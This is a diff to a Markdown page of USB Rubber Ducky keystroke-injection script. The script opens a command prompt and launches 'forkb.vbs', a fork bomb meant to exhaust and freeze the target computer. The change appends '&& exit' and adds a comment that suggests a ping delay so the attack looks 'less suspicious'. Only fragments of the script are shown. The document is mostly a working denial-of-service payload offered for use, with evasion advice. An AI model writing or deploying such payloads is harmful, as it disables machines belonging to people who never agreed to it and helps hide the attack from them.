@@ -8,8 +8,7 @@ Version 1.0
 
 # Code for Rubber Ducky
 
-<pre><code>
-GUI r
+<pre><code>GUI r
 DELAY 500
 STRING cmd
 ENTER
@@ -24,9 +23,8 @@ STRING loop
 CTRL z
 ENTER
 DELAY 50
-REM STRING ping localhost -n 10
-REM You can uncomment this ^ to delay 10 seconds before starting the fork bomb. (By this way it's less suspicious)
-STRING start forkb.vbs
+STRING start forkb.vbs && exit
+REM You can add this: ">null ping localhost -n 5 && " before "start" to make a (5 sec) delay before the vbs execution. (By this way it's less suspicious)
 ENTER
 </pre></code>
 
